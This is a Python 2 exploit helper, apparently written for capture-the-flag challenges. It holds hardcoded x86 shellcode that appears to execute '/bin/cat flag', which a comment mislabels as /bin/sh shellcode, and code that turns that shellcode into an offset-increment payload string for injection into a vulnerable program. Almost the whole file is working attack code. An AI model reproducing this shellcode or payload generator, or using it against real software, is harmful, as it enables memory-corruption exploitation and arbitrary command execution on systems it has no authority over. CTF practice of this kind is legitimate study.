import argparse
#[NOTES] @author // 0x4a47
#i have found the need for this generator in my CTF travels.
#it will take in a 1-byte value (offset) and some shellcode and generate the required
#increments to write that shellcode in the specified offset location.

#/bin/sh shellcode
#http://shell-storm.org/shellcode/files/shellcode-827.php does not work
#http://shell-storm.org/shellcode/files/shellcode-811.php WORKS, but read() eats my bytes
shellcode = "\x31\xc0\x50\x68\x66\x6c\x61\x67\x89\xe6\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x56\x53\x89\xe1\x8b\x54\x24\x08\xb0\x0b\xcd\x80"
offset = "\x14"
increment_operator = "*"

#[INFO] converts the current hex byte in the shellcode string to ints integer value
def convert_byte_to_int(byte):
    return int(byte.encode('hex'), 16)

#[INFO] generates the python-print payload for the shellcode writes based on the increments list and offset
def generate_payload(os,increments):
    payload_writes = []
    final_string = ""
    #[COMMENT] for each one of the bytes to write, take the offset & increment the offset value by 1 & append the increment
    for i in range(0, len(increments)):
        offset_loc = int(offset.encode('hex'), 16) + i
        #[COMMENT] creates the formatted hex-write string for python input
        #format: "\xoffset" * increment
        payload_write_int = "\"\\x%0.2X\"" % offset_loc, increment_operator, increments[i]
        #[COMMENT] this then joins the int tuples into the actual string value for the write
        payload_write_str = ''.join(map(str,payload_write_int))
        #[COMMENT] append each write string to the list of writes that need to occur for the shellcode.
        payload_writes.append(payload_write_str)

    #[COMMENT]
    #now join the writes into a string for the actual python
    final_string = ' + '.join(payload_writes)

    #[COMMENT]
    #finally, give the user that sweet sweet payload
    print final_string

def main():
    #[COMMENT]
    #create an array for each increment value
    increments = []
    #[COMMENT]
    #for every byte in the shellcode, convert it to a decimal and store it in the increments array for later.
    for i in range(0, len(shellcode)):
        increments.append(convert_byte_to_int(shellcode[i]))
    #[COMMENT]
    #generate the payload based on those increments
    generate_payload(offset, increments)

if __name__ == '__main__':
    main()
